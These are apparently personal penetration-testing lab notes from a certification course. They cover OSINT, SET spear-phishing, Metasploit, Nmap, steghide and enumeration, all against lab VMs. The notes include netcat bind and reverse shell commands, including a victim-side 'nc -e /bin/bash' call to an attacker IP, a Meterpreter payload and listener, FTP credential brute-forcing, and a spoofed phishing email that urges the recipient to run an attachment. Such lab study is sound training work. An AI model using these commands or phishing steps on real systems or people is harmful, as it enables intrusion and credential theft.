# Lab Notes

<!-- TOC -->

- [Lab Notes](#lab-notes)
  - [03: Assisted Lab: Navigating Open-Source Intelligence Tools](#03-assisted-lab-navigating-open-source-intelligence-tools)
  - [SET - SOcial Engineering Toolkit](#set---social-engineering-toolkit)
    - [Explore SET](#explore-set)
    - [Use Spear Phishing](#use-spear-phishing)
    - [SET Listeners](#set-listeners)
  - [Nmap Commands](#nmap-commands)
  - [Steghide](#steghide)
  - [Enumeration](#enumeration)
  - [Metasploit](#metasploit)
  - [Reverse Shells](#reverse-shells)
    - [Bind Shells](#bind-shells)
    - [Reverse Shell](#reverse-shell)

<!-- /TOC -->

## 03: Assisted Lab: Navigating Open-Source Intelligence Tools

```
# theHarvester -d comptia.org -b google -l 5 -f Desktop/results.html
```

## SET - SOcial Engineering Toolkit
### Explore SET
The Social Engineering Toolkit (SET) is an open source framework for social engineering written in Python. It is a text based, menu driven program which is included with Kali or can be installed on other systems.

For the activities in this lab, you will be using the Kali VM.

1. Log into the PT1-Kali virtual machine using root as the username and Pa$$w0rd as the password.
2. Open a Terminal window from the top left menu bar. terminal-icon.png
3. SET can be started from the menus or by simply typing setoolkit at the prompt.
   ```bash
   # setoolkit
   ```

    On initial start up of SET and each time you change menu areas, there will be a slight pause due to this lab environment not having Internet access. SET tries to check for updates, this will time out and lead to a red message stating "Unable to check for new version of SET (is your network up?)." You can ignore this warning, it will not affect the lab.

    Since SET is menu driven, you simply need to type in the number associated with your choice and press the ENTER key. To back up in the menu tree, simply type in 99 and press ENTER. Entering 99 at the top level menu will exit SET.

    The bulk of SET's functionality can be found under the Social-Engineering Attacks menu option, 1.

4. Type 1 and press ENTER to choose the Social-Engineering Attacks menu choice.

### Use Spear Phishing
For this section , we will continue to explore SET and look further into the mass mailer attacks. There are two options for Mass Mailer Attacks:
   * Sending to an individual email address
   * Import a list to send to multiple email addresses.
  
   1. Continuing in the Terminal of the PT1-Kali virtual machine, enter 5 to choose Mass Mailer Attacks.
   2. Enter 1 to choose Email Attack Single Email Address. <br/> Since we will not actually be able to send an email attack, let's use a fake email address and complete the process.
   3. Enter test@test.net for Send email to. <br/> SET supports sending emails through GMail in addition to your own server or an open mail relay.
   4. Enter 2 to choose own server or open relay.
   5. Enter support@comptia.org as the From address.
   6. Enter Support Department as the From name. <br/> It is common practice to spoof the From address to trick the recipient into believing the attack email is from a legitimate entity.
   7. At the "Username for the relay" prompt, press ENTER to leave blank as we will not be sending this attack. Use an appropriate username for the server in a real campaign.
   8. Again, press ENTER to leave the password for the relay blank.
   9. Enter 10.1.16.192 as the SMTP server address.
   10. Press ENTER to use the default server port (25).
   11. Enter either y or n to answer the question about flagging the email as high priority.
   12. Enter y to add an attachment and add the payload you made in the previous section of the lab.
   13. Enter /root/.set/payload.exe as the payload path. <br/> Typically, you would change the filename of the payload file if this was part of a real penetration test.
   14. Enter n to add an inline attachment.
   15. Type Important Account Update as the Email Subject: and press ENTER.
   16. Type p, then ENTER to send this email in plaintext format. If you were sending a link for the target to click, use h for the HTML format.
   17. Type the text of the email: Please run the attached file to complete an important update to your account or your certs will automatically expire!
   18. Press ENTER.
   19. At the "Next line of the body:" prompt, type: END in all caps, then press ENTER. <br/> This will attempt to send the email, and fail. You will receive an error message - unable to establish an connection to the SMTP server. Try again. <br/> SET will exit and return to the prompt. If a mail server was set up with internet access, this would have sent and then returned to the menu.

### SET Listeners
If the spear phishing attack from the last section was real, and our target ran the attachment, you would need a listener to receive the reverse shell connection.

   1. Continuing in the Terminal of the PT1-Kali virtual machine, restart SET by typing setoolkit at the prompt
   2. Enter 1 to choose Social-Engineering Attacks.
   3. Enter 4 for Create a Payload and Listener. <br/> Let's run through the steps of creating a payload again and set up a listener this time.
   4. Enter 2 to select Windows Reverse_TCP Meterpreter.
   5. Enter 10.1.16.192 to set up the Listener IP address to the Kali VM IP address.
   6. This time, enter 443 to set the port for the Listener. <br/> The payload will be generated and the file will be stored as payload.exe in the /root/.set as shown below.

    Note: Each time you create a payload with SET it uses the same default name and will overwrite any previous payload. If you want to keep a previously created payload, rename it before creating another. Since we are doing the same payload again, in this case it is not an issue.

   7. Since we do want to start the listener, enter y to set up the listener. <br/> SET launches msfconsole or the Metasploit Framework Console and sets up a listener on the IP and port specified as shown. <br/> If the target were to run the payload, it would create a shell and connect back to this listener. You could interact with the system by using the command sessions -i 1.
   8. But since there are no sessions, close the msfconsole by entering exit at the prompt and return to the SET menu.
   9.  Enter 99 to return to the main menu, and then 99 to exit SET.


## Nmap Commands
* Basic Scan
   ```bash
   # nmap -O -sV -p- 10.1.16.9
   # nmap -O 10.1.16.0/24 -oX enum.xml && xsltproc enum.xml -o enum.html
   ```



* Redirections
 ```bash
 nmap 10.1.16.9 > defaultports.txt
 diff -y -d defaultports.txt allports.txt
 ```
* Outputs
  * Run an Nmap vulnerability scan on metasploitable.
     ```bash
     # nmap --script=vuln 10.1.16.9 -oX vuln-scan.xml
     ```
  * Next, convert the .XML file to .HTML using xsltproc.
     ```bash
     #xsltproc vuln-scan.xml -o vuln-scan.html
     ```
  * Now that the file is in an .HTML format, let's take a look at the output.
     ```bash
     # firefox vuln-scan.html
     ```

## Steghide
* Hide Text file within a jpeg file
  ```bash
  # steghide embed -cf ~/Pictures/Square.jpeg -ef secret.txt
  ```
* Extract the hidden file
  ```bash
  # steghide extract -sf Square.jpeg
  ```

## Enumeration
* Nmap scan
   ```bash
   # nmap -O 10.1.16.0/24 -oX enum.xml && xsltproc enum.xml -o enum.html
   # nmap -sV -p- 10.1.16.9 -oX enum2.xml
   # xsltproc enum2.xml -o enum2.html
   ```
* Run vulnerability scan against ftp
   ```bash
   # nmap --script=vuln 10.1.16.9 -p 21
   ```
* Enumerating Web Directories
   ```bash
   # dirb http://10.1.16.9/
   # nikto -h 10.1.16.9
   ```

## Metasploit
* Start
   ```bash
   # msfconsole
   ```
* Search an exploit
   ```bash
   search name:Apple type:exploit
   ```
* check details of an exploit
   ```bash
   msf5> info exploit/apple_ios/browser/safari_libtiff
   ```
* Nmap scan within Metasploit
   ```bash
   msf5> nmap -A 10.1.16.9
   msf5> nmap -sn 10.1.16.0/24
   ```
* Using Attack Modules in Metasploit
   ```bash
   msf5> use auxiliary/scanner/ftp/ftp_login
   msf5> show options
   msf5> set PASS_FILE /media/cdrom0/Lab14/top13-bad-passwords.txt
   msf5> set USER_FILE /media/cdrom0/Lab14/top13-bad-usernames.txt
   msf5> set RHOSTS 10.1.16.9
   msf5> run
   ```
* clear a setting using ```unset``` command

## Reverse Shells
### Bind Shells
* Target machine
  ```bash
  # sudo nc -nvlp 1000 -e /bin/bash
  ```
* Attacker
  ```bash
  # nc -nv 10.1.16.9 1000
  # whoami
  ```
### Reverse Shell
* Attacker
  ```bash
  # nc -nvlp 1000
  ```
* Victim
  ```bash
  # nc -nv 10.1.16.192 1000 -e /bin/bash
  ```
* Attacker
  ```bash
  # whoami
  ```
